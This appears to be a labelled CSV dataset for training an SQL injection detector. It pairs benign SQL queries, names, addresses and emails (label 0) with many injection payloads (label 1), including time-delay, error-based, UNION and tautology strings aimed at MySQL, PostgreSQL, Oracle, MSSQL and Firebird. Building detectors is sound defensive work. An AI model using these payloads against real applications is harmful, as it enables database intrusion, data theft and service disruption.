Query,Label
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""kldp"" like ""kldp",1
-1393'   )    )     )   union all select 8280--,1
"1   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  4127  =  4127",1
marciniu,0
raimulfo,0
"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
SELECT AVG ( basis ) FROM broke SELECT SUM ( rule ) ,0
"   SELECT music, noun, where FROM she WHERE rather  IS NULL",0
SELECT * FROM progress WHERE east = 'probably'  AND  ( diagram = 'usually' OR fifth = 'tribe' ) ,0
25613,0
//*,1
6.28598E+15,0
atolera,0
"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",1
SELECT TOP 50 PERCENT * FROM useful,0
SELECT interest ( s )  FROM hung LEFT JOIN,0
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",1
roda deita,0
SELECT * FROM chair WHERE count = 'general' LIMIT 3,0
SELECT * FROM  ( SELECT each FROM early ) ,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3836 )  ORDER BY meta_id ASC",0
1%'   )    )     )   and 3916  =  6327--,1
FROM  ( SELECT DISTINCT term FROM river ) ,0
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",1
SELECT * FROM town WHERE industrial = 'under'  AND City = 'mill',0
"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
calle eduard toldra 137 5?a,0
embargad!o,0
7242,0
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',0
"INSERT INTO capital ( factory, this, shake, sides, under, cut )  VALUES  ( 'variety', 'bear'. spoken', 'slight', 'nails', 'mission', 'lying' )  ",0
"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",1
SELECT * FROM forth WHERE missing = 'outer',0
SELECT * FROM widely WHERE    NOT muscle = 'area',0
SELECT * FROM Customers ORDER BY CustomerName ASC;,0
quinn,0
 UPDATE gently SET widely = 'president'WHERE manufacturing = 'grew',0
argamasilla de calatrava,0
SELECT hang,0
"1,  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1
"calle rendona 45, 5-a",0
thorpe,0
piejo,0
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,1
1'||  (  select 'qdkb' where 4331  =  4331,1
"   SELECT COUNT ( printed ) , zoo FROM struggle BY dish",0
rumsey@ubikuo.coop,0
"1%'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  '",1
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'hhbh'  =  'hhbh",1
garcilln,0
69054908f,0
SELECT come FROM realize UNION SELECT instrument FROM fly ORDER BY sell,0
SELECT * FROM motion ORDER BY fat DESC,0
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
1%' waitfor delay '0:0:5' and '%'  =  ',1
"1%' union all select null,null#",1
1  )   and 5196  =  9002,1
"-2916""   )    )    or 4946  =  8232--",1
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE Products.SupplierID  =  Suppliers.supplierID AND Price < 20 ) ;,0
" select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",1
7.87131E+15,0
1'+  (  select 'ncny' where 5634  =  5634,1
completorio,0
SELECT * FROM route FETCH FIRST 3 ROWS ONLY,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367576 ) ,0
rasifo,0
" SELECT * FROM family ORDER BY south, angle",0
DELETE FROM likely,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""dros""  =  ""dros",1
SELECT column_name FROM table1 UNION ALL,0
"   SELECT COUNT ( motor ) , brick FROM press BY outline",0
SELECT * FROM low WHERE thee NOT BETWEEN 'enjoy' AND 'factor',0
vinaixa calleiros,0
"-1303' union all select 4840,4840#",1
SELECT * FROM general 3,0
SELECT * FROM per ORDER BY younger DESC,0
SELECT AVG ( various )  FROM stop  SELECT SUM ( women ) ,0
if  (  9770  =  9748  )   select 9770 else drop function zyuo--,1
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve,0
"   SELECT COUNT ( CustomerID ) , CountryFROM CustomersGROUP BY Country;",0
"   SELECT plant,press,daughter,sand,connected     (  (  guard JOIN leader ON current.gradually =  better.silence )   INNER JOIN readerON Orders.young =  explain.parallelID ) ",0
"SELECT * FROM train WHERE with BETWEEN ""dull"" AND    ""period""",0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_3_link' LIMIT 1,0
"   SELECT establish, instead+ ', ' + general+ ' ' + ants+ ', ' + slipped AS stood  FROM person",0
9.36496E+14,0
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1
"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1
"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621",1
SELECT * FROM sound ORDER BY mission DESC,0
me93a,0
6.6591E+15,0
0,1
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1
SELECT * FROM however WHERE wealth IN  ( SELECT repeat FROM engine ) ,0
SELECT TOP 50 PERCENT * FROM real,0
hargreav,0
SELECT hearing FROM local UNION SELECT short FROM film ORDER BY show,0
5.67192E+14,0
select   (  case when   (  3565  =  4053  )   then 3565 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1
"1' in boolean mode  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_bottom_content' LIMIT 1,0
columbino,0
"  SELECT call,fear FROM gate WHERE get = 'cutting' UNION SELECT terrible, keep FROM underline",0
admin'  )   or   (  '1'  =  '1'/*,1
SELECT SYSDATE (  ) ;,0
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347697 )  ORDER BY meta_id ASC",0
SELECT * FROM by WHERE    NOT giant = 'school',0
SELECT * FROM newspaper FETCH FIRST 50 PERCENT ROWS ONLY,0
"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",1
SELECT alive ( s )  FROM usually SELECT exactly FROM arm,0
1.86E+15,0
SELECT Count ( * )  AS exactly,0
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1
"maestro de burgos, 199",0
SELECT option_value FROM wp_options WHERE option_name  =  'sm_organize_media' LIMIT 1,0
SELECT AVG ( silk ) FROM edge,0
SELECT airplane ( s )  FROM jump UNION,0
clipsham5,0
"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",1
godall,0
SELECT TOP 3 * FROM wait WHERE electric = 'southern',0
"-8950""   )    )    as uahs where 2113  =  2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1
"1""  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
alises,0
SELECT * FROM together WHERE birthday IN  ( SELECT location FROM entire ) ,0
46842,0
SELECT * FROM labor ORDER BY slide,0
 UPDATE rhythm SET moment = 'purpose'WHERE mice = 'torn',0
"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",1
"   SELECT pool, thick, relationship FROM motion WHERE stock  IS NULL",0
48c09a,0
SELECT * FROM grandmother WHERE during LIKE '%blind%',0
ataz crehuet,0
SELECT * FROM down 3,0
SELECT COUNT ( thirty ) FROM bar,0
1.85884E+15,0
"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",1
SELECT * FROM between WHERE palace  BETWEEN 10 AND 20,0
"1'  )   as keom where 7524  =  7524 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM detail WHERE building = 'sum' LIMIT 3,0
10262643c,0
"1 where 9072  =  9072 and elt  (  4249  =  4249,7259  )  --",1
SELECT poor FROM battle UNION SELECT piano FROM got ORDER BY principal,0
"1""   )    )    as qode where 2398  =  2398 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"   SELECT joined, boat+ ', ' + its+ ' ' + label+ ', ' + broken AS club  FROM joy",0
SELECT success FROM gate UNION SELECT selection FROM planned ORDER BY outside,0
SELECT * FROM mountain WHERE block BETWEEN modern09/01/1996dollar AND come15/31/1996love,0
SELECT option_value FROM wp_options WHERE option_name  =  'auto_update_redux_google_fonts' LIMIT 1,0
"1"" where 4294  =  4294 and make_set  (  2543  =  7988,7988  )  --",1
"1""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,1
46841,0
SELECT TOP 50 PERCENT * FROM pure,0
SELECT * FROM blue WHERE free = 'officer' LIMIT 3,0
"-2211"" or 2113  =  8885#",1
camisoln,0
trespalacios latorre,0
26143,0
SELECT * FROM in WHERE behavior = 'heart' LIMIT 3,0
1'||  (  select 'ydvg' from dual where 7108  =  7108,1
piggott@firstchoicecoffee.gq,0
1%'   )    )    union all select null--,1
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
SELECT AVG ( dot ) FROM building SELECT SUM ( noted ) ,0
1%'  )   union all select null--,1
"calle ginebra, 138",0
"1'   )    )    as popm where 6594  =  6594 union all select null,null#",1
"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
1'  )   where 3893  =  3893,1
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""njdx"" like ""njdx",1
desc,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c885367717' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
trish,0
deiadrel,0
"1""  )   where 5129  =  5129 order by 1--",1
SELECT * FROM bicycle WHERE slabs = 'position'  OR breathe = 'settlers',0
"1"" and elt  (  4594  =  1040,1040  )  ",1
SELECT wing FROM college,0
milligan,0
SELECT * FROM chest,0
6.98863E+15,0
portal,0
palacn aucapia,0
91436910l,0
ja34ico,0
beato,0
511amasa,0
SELECT * FROM dish WHERE mail = 'wet',0
SELECT writer ( s )  FROM entire SELECT thirty ( s ) ,0
SELECT * FROM spend WHERE gas = 'weather'  AND  ( research = 'rising' OR mine = 'molecular' ) ,0
select   (  case when   (  5390  =  7419  )   then 5390 else 5390*  (  select 5390 from mysql.db  )   end  )  #,1
SELECT MIN ( customs )  AS telephone FROM zipper,0
regir,0
noel,0
SELECT * FROM structure WHERE brought BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT * FROM strike WHERE science NOT IN  ( 'nuts', 'suggest', 'join' )  ",0
aitor,0
tristan,0
ornela,0
"SELECT * FROM summer WHERE stuck BETWEEN ""friendly"" AND    ""tiny""",0
SELECT vast ( s )  FROM queen UNION,0
SELECT AVG ( Price ) FROM income,0
" SELECT * FROM discovery ORDER BY hollow, guess",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 173 )  ORDER BY meta_id ASC",0
9110,0
"c/ ereta, 104,",0
laruffa,0
ayoroa,0
SELECT * FROM lost FETCH FIRST 50 PERCENT ROWS ONLY,0
sashya,0
"   SELECT melted, safe, tuneFROM around WHERE ready  IS NOT NULL",0
"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
excusana,0
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 181 )  ORDER BY meta_id ASC",0
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui",1
2.02612E+15,0
"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",1
SELECT * FROM [Brazil Customers]; CREATE PROCEDURE SelectAllCustomers AS,0
SELECT * FROM sum WHERE crack NOT BETWEEN 'pond' AND 'mountain',0
"  SELECT announced,noon FROM beginning WHERE brown = 'cave' UNION SELECT foot, quiet FROM rabbit",0
shih_brusse@professionalhost.jp,0
"tres villas, las",0
yaser,0
SELECT equator,0
3.4285E+15,0
1'  )   where 4509  =  4509 union all select null--,1
select case when 5559  =  3483 then 1 else null end--,1
SELECT * FROM hungry FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM knowledge,0
18121520g,0
harold_veigel@ilusionarium.sk,0
SELECT TOP 3 * FROM hard WHERE instead = 'his' SELECT * FROM next,0
"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",1
SELECT COUNT ( wild )  FROM made,0
-2790'   )    )    or 8571  =  8571--,1
SELECT * FROM  ( SELECT golden FROM best ) ,0
"1' where 7504  =  7504 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT * FROM straw FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM behind,0
-2210' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'myvr' like 'myvr,1
boca de hurgano,0
"   SELECT broad, blank+ ', ' + alike+ ' ' + managed+ ', ' + smallest AS dangerous  FROM meet",0
19338,0
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'hokd'  =  'hokd,1
SELECT knew ( s )  FROM know SELECT darkness ( s ) ,0
"select * from generate_series  (  7494,7494,case when   (  7494  =  7854  )   then 1 else 0 end  )   limit 1--",1
6.64228E+14,0
" SELECT * FROM jump ORDER BY little ASC, make DESC",0
SELECT * FROM equipment  WHERE horse = eaten,0
"1   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   6829  =  6829",1
5.53776E+15,0
"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",1
"1'||  (  select 'gikt' where 8447  =  8447 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT AVG ( Price ) FROM together,0
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --",1
"1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #",1
SELECT lunch ( s )  FROM date LEFT JOIN,0
8374f09a2,0
1'+  (  select nxfp where 5006  =  5006,1
gabriele,0
"  SELECT IFNULL ( NULL, 500 ) ;",0
SELECT column_name FROM table_name WHERE column_name operator ANY,0
-2402 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- szgq,1
"1%""   )    )     )   and 3116  =  9088#",1
SELECT * FROM neighborhood WHERE zero = 'earlier',0
SELECT AVG ( notice ) FROM sets,0
"iif  (  7036  =  2370,1,1/0  )  ",1
SELECT * FROM chief WHERE morning LIKE '%force%',0
enratonarse,0
SELECT * FROM yet WHERE slave = 'top',0
SELECT * FROM earlier WHERE write = 'oxygen'  OR wool = 'lie',0
SELECT MIN ( uncle )  AS if FROM almost,0
"  SELECT include,corner,first FROM thin LEFT JOIN Orders ON tongue.freshID =  young.class ORDER BY everywhere.flew",0
"  SELECT nextID AS ID, among AS wore FROM sit",0
SELECT option_value FROM wp_options WHERE option_name  =  'options_location_address' LIMIT 1,0
"  SELECT Orders.riderID, Employees.soon, Employees.diagram FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.seemsID ORDER BY Orders.featureID",0
39499084b,0
SELECT * FROM car WHERE won IN  ( SELECT silver FROM general ) ,0
ammiel,0
lor81a5o,0
" SELECT INSTR ( CustomerName, ""a"" )  FROM Customers;",0
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,1
"select * from generate_series  (  1431,1431,case when   (  1431  =  7822  )   then 1 else 0 end  )   limit 1--",1
SELECT * FROM job FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1
SELECT COUNT ( womenID ) FROM merely,0
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,1
"INSERT INTO my ( beneath, clock, worth, cannot, how, bear )  VALUES  ( 'flame', 'knew'. save', 'opinion', 'smoke', 'satisfied', 'model' )  ",0
"   SELECT occur, was, castFROM make WHERE outline  IS NOT NULL",0
"  SELECT MID ( ""SQL Tutorial"", 5, 3 )  AS ExtractString;",0
parmenia,0
SELECT * FROM industrial  WHERE drew = rice,0
87348482w,0
SELECT try FROM ball UNION ALL SELECT anyway FROM stock ORDER BY yourself,0
-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,1
SELECT * FROM movement WHERE stuck = 'combination'  AND  ( change = 'apartment' OR widely = 'egg' ) ,0
min81t8,0
SELECT COUNT ( rain )  FROM question,0
SELECT * FROM gas WHERE NOT attention = 'hollow'  AND NOT cell = 'search',0
SELECT * FROM imagine WHERE these = 'goes' FETCH FIRST 3 ROWS ONLY,0
56702228y,0
"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
" SELECT * FROM this ORDER BY older ASC, clearly DESC",0
8230,0
SELECT COUNT ( worryID ) FROM dog,0
1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,1
SELECT * FROM seldom WHERE NOT ourselves = 'bigger'  AND NOT know = 'hope',0
SELECT zero FROM write UNION ALL SELECT future FROM police ORDER BY aid,0
SELECT * FROM ten WHERE main NOT LIKE 'sets%',0
SELECT * FROM dog WHERE replied = 'golden' LIMIT 3,0
SELECT * FROM end FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""ytju"" like ""ytju",1
1'+  (  select taga where 8036  =  8036,1
SELECT COUNT ( mailID ) FROM shore,0
"1  )   union all select null,null,null,null,null,null,null,null--",1
"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",1
"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",1
"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",1
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
navalmoral de bjar,0
SELECT COUNT ( DISTINCT equator )  FROM manufacturing,0
severiano,0
rec,0
castillejo de meslen,0
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb",1
causa,0
"SELECT column1 , column2, ... FROM table_name ;",0
"1  )   union all select null,null,null,null#",1
SELECT bell ( s )  FROM main,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",1
" SELECT FIELD ( ""q"", ""s"", ""q"", ""l"" ) ; ",0
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # tqmr",1
SELECT * FROM mill FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM power,0
SELECT * FROM simply ORDER BY desk DESC,0
"1""  )   and 9198  =  9198--",1
halbert,0
SELECT * FROM friendly WHERE possibly = 'interest' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM statement WHERE bell  BETWEEN 10 AND 20,0
-9355' or 6872  =  6872 and 'mztk'  =  'mztk,1
select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,1
SELECT COUNT ( DISTINCT quietly )  FROM college,0
"1  )   union all select null,null,null,null,null,null#",1
SELECT MIN ( conversation )  AS region FROM troops,0
"  SELECT determine,effect,muscle FROM plates LEFT JOIN Orders ON supper.essentialID =  this.balance ORDER BY coat.zero",0
SELECT TOP 3 * FROM connected WHERE flew = 'meat',0
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1
1   )    )    as syot where 1199  =  1199,1
pr3caz,0
37796,0
